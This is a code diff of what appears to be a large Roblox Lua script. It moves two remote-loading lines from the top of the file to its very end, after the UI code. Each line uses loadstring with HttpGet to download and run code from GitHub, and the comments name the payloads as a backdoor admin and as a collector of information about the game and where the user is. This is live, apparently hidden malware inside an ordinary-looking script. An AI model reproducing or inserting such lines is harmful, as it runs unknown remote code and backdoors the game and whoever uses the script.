@@ -1,7 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/Backdoor",true))() -- BasicalBackdoorAdmin
-wait()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/Not",true))() -- BasicalInfoAbtGameAndWheresUser
-wait()
+
 -- loadstring(game:HttpGet("",true))()
 
 
@@ -12313,3 +12310,7 @@ coroutine.wrap(function()
 	IntroBackground:Destroy()
 	minimizeHolder()
 end)()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/Backdoor",true))() -- BasicalBackdoorAdmin
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/Not",true))() -- BasicalInfoAbtGameAndWheresUser
+wait()
